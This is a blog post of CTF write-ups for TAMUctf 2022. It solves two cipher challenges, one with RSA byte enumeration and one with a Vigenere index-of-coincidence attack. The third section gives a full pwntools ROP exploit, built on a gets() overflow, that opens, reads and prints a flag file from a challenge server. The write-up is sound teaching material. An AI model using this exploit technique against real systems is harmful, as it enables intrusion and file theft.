+++
title = "TAMUctf 2022"
date = 2022-04-15
slug="TAMUctf-2022"
description = "Writeups for some of the crypto and pwn challenges."
+++

# Crypto - Take a Byte
We found this code along with these numbers. Any idea on what to do?

## Investigation:
Looking at `data.txt`, we are given N, e, and then a bunch of ciphertexts. It appears as though each ciphertext is actually the encryption of a single character in the flag, so what we can do is find the ciphertext corresponding to every character, create a map from ciphertexts to characters, and decode the flag

## Solution:
Used the following script:

``` py
with open('data.txt', 'r') as inFile:
    data = inFile.readlines()
    N = int(data[0].split('=')[1].strip())
    e = 65537
    ct = data[2][7:-2].strip().split(' ')

ct_to_chr = {}
for i in range(0xff+1):
    ct_to_chr[pow(i, e, N)] = chr(i)

print('gigem{',end='')
for c in ct:
    print(ct_to_chr[int(c)], end="")
print('}')
```

and we have flag: `gigem{enumerable_SeArCh_SpAcEs_4R3_WEAK_0xBEEF}`

# Crypto - INdie CO
INDie COmpany Internal Message #122521
To: Dr Friedman From: [REDACTED]

We finally found that document you were looking for. It exists! However it's written in code; you're the best cryptographer we have. Decode it and get that flag!

Hints: 
- Dr Friedman was a real person
- The flag is at the end of the file
- The values might need some fine tuning

## Investigation
We are given a really long ciphertext, and the curly braces at the end suggest our flag is in there.
Some googling about friedman cryptography reveals a wikipedia for William F. Friedman, which contains mention of his the cryptanalysis tool "index of coincidence". Some more googling reveals that the index of coincidence can be used to estimate the key length of a vigenere cipher.

## Solution
Used this script to find at where the IoC is the highest:
``` py
import string

alph = list(string.ascii_uppercase)

def getIOC(text):
	letterCounts = []

	# Loop through each letter in the alphabet - count number of times it appears
	for i in range(26):
		count = 0
		for j in text:
			if j == alph[i]:
				count += 1
		letterCounts.append(count)

	# Loop through all letter counts, applying the calculation (the sigma part)
	total = 0
	for i in range(len(letterCounts)):
		ni = letterCounts[i]
		total += ni * (ni - 1)

	N = len(text)
	c = 26.0 # Number of letters in the alphabet
	total = float(total) / ((N * (N - 1)))
	return total


def getAvgIOC(array):
    tot = 0.0
    for i in array:
        tot += getIOC(i)
    return tot/len(array)

with open('./data.txt', 'r') as inF:
    data = inF.read().replace('{','').replace('}','')
    print(getIOC(data))
    for i in range(1, 30):
        temp = ['']*i
        for j,c in enumerate(data):
            temp[j%i] += c
        print(i, getAvgIOC(temp))
```

It appears that our key is 12 characters long. Using this tool: https://www.dcode.fr/vigenere-cipher and choosing the option for knowing the key length, it gives us the key: `MKWOFVNJOJUO`. Use cyber chef to decode. Strangely, the part inside the curly braces didn't decode correctly, but adding an extra character right after the opening curly brace gives the rest of the flag. Presumably this is an issue of cyber chef not decoding the curly brace so it doesn't move to the next character of the key, but the vigenere implementation to create the ciphertext probably did.

flag: `gigem{deepfriedmanindexofcoincidence}`

# Pwn - One and Done
It's trivial, but not! There are no other files in the target than this binary and the flag at /pwn/flag.txt, so you can't use anything else!

## Investigation
We are given source code:
``` C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>

void handler(int sig) {
    fprintf(stderr, "looks like you crashed buddy\n");
    exit(0);
}

int main() {
    struct sigaction sa;
    memset(&sa, '\0', sizeof(sa));
    sa.sa_sigaction = &handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);

    char buf[128];

    puts("pwn me pls");
    gets(buf);
}
```
Nothing much here, guess it's ROP time. running ROPgadget, there's 755 gadgets found, so hopefully enough to do what we need. The plan is: 
1. write "/pwn/flag.txt" to a buffer
2. open the file
3. read the flag to a buffer
4. write the flag from the buffer to stdout

First, we need to find somewhere we can write and read. To do this, run the program in gdb, break while it is running and check vmmap for somewhere readable and writeable:

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00000000400000 0x00000000401000 0x00000000000000 r-- /home/anomie/tamuctf2022/pwn/one_and_done/one-and-done
0x00000000401000 0x00000000403000 0x00000000001000 r-x /home/anomie/tamuctf2022/pwn/one_and_done/one-and-done
0x00000000403000 0x00000000404000 0x00000000003000 r-- /home/anomie/tamuctf2022/pwn/one_and_done/one-and-done
0x00000000404000 0x00000000406000 0x00000000003000 rw- /home/anomie/tamuctf2022/pwn/one_and_done/one-and-done
0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]
0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]
0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
```

We see that the memory from `0x00000000404000-0x00000000406000` fits our needs. examining the memory there, there's a bunch of null bytes around `0x4040a0`, which means it might be unused and writing there won't break anything:
```
gef➤  x/64x 0x00000000404000
0x404000:	0x6b6f6f6c	0x696c2073	0x7920656b	0x6320756f
0x404010:	0x68736172	0x62206465	0x79646475	0x7770000a
0x404020:	0x656d206e	0x736c7020	0x65642f00	0x756e2f76
0x404030:	0x00006c6c	0x00000000	0x7fffffff	0xfffffffc
0x404040:	0xffffffff	0xffffffff	0x00000014	0x00000000
0x404050:	0x00527a01	0x01107801	0x08070c1b	0x00000190
0x404060:	0x00000018	0x0000001c	0xffffe135	0x00000035
0x404070:	0x100e4100	0x0d430286	0x00000006	0x0000001c
0x404080:	0x00000038	0xffffe14e	0x00000079	0x100e4100
0x404090:	0x0d430286	0x0c740206	0x00000807	0x00000000
0x4040a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x4040b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x4040c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x4040d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x4040e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x4040f0:	0x00000000	0x00000000	0x00000000	0x00000000
```

Now that we have somewhere to store our data, we need to find the right gadgets to write there. ROPgadget finds this mov we can use:
```
0x000000000040198d : mov dword ptr [rdi + rdx - 0x27], eax ; mov rax, rdi ; ret
```

Kinda strange, but usable as long as we can set `rdi`, `rdx`, and `eax` to what we need. Here's the gadgets to do that:
```
0x0000000000401793 : pop rdi ; ret
0x0000000000401f31 : pop rdx ; ret
0x000000000040100b : pop rax ; ret
``` 
Note that the lowest 4 bytes of `rax` is `eax`, so this will work for setting `eax`

The only things left that we need are gadgets for syscall, and setting `rsi` for the args to syscalls. Here they are:
```
0x0000000000401713 : pop rsi ; ret
0x0000000000401ab2 : syscall ; ret
```

We have all the things needed, so time to assemble the payload

## Solution
Here's the solve script:
``` py
from pwn import *

elf = ELF('./one-and-done')
target = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")
#target = process(elf.path)

#gdb.attach(target, gdbscript='b *main+120')
#context.binary = elf.path
#context.log_level = 'DEBUG'

pop_rdi_ret = p64(0x0000000000401793)
pop_rdx_ret = p64(0x0000000000401f31)
pop_rax_ret = p64(0x000000000040100b)
pop_rsi_ret = p64(0x0000000000401713)
syscall_ret = p64(0x0000000000401ab2)
mov_dst_eax = p64(0x000000000040198d) # NOTE: mov dword ptr [rdi + rdx - 0x27], eax ; mov rax, rdi ; ret

buf_addr = p64(0x4040a0)

payload = b'A'*(296)
# 1. write "/pwn/flag.txt" to memory (0x4040a0 is writable and empty)
rdi = p64(0x4040a0 + 0x27)
rdx = p64(0x00)
eax = p64(0x6e77702f)
payload += pop_rdi_ret + rdi + pop_rdx_ret + rdx + pop_rax_ret + eax + mov_dst_eax

rdi = p64(0x4040a0 + 0x27 + 0x04)
rdx = p64(0x00)
eax = p64(0x616c662f)
payload += pop_rdi_ret + rdi + pop_rdx_ret + rdx + pop_rax_ret + eax + mov_dst_eax

rdi = p64(0x4040a0 + 0x27 + 0x08)
rdx = p64(0x00)
eax = p64(0x78742e67)
payload += pop_rdi_ret + rdi + pop_rdx_ret + rdx + pop_rax_ret + eax + mov_dst_eax

rdi = p64(0x4040a0 + 0x27 + 0x0c)
rdx = p64(0x00)
eax = p64(0x74)
payload += pop_rdi_ret + rdi + pop_rdx_ret + rdx + pop_rax_ret + eax + mov_dst_eax

# 2. open the file for reading syscall:
rax = p64(0x02)
rdi = p64(0x4040a0)
rsi = p64(0x00)
payload += pop_rax_ret + rax + pop_rdi_ret + rdi + pop_rsi_ret + rsi + syscall_ret

# 3. read the file to a buffer
rax = p64(0x00)
rdi = p64(0x03)
rsi = p64(0x4040a0)
rdx = p64(0xff)
payload += pop_rax_ret + rax + pop_rdi_ret + rdi + pop_rsi_ret + rsi + pop_rdx_ret + rdx + syscall_ret

# 4. write buffer to stdout
rax = p64(0x01)
rdi = p64(0x01)
rsi = p64(0x4040a0)
rdx = p64(0xff)
payload += pop_rax_ret + rax + pop_rdi_ret + rdi + pop_rsi_ret + rsi + pop_rdx_ret + rdx + syscall_ret

# 5. exit() to prove ropchain executed to the end
rax = p64(60)
rdi = p64(0x00)

payload += pop_rax_ret + rax + pop_rdi_ret + rdi + syscall_ret 

target.recv()
target.sendline(payload)
target.interactive()
```

flag: `gigem{trivial_but_its_static}`

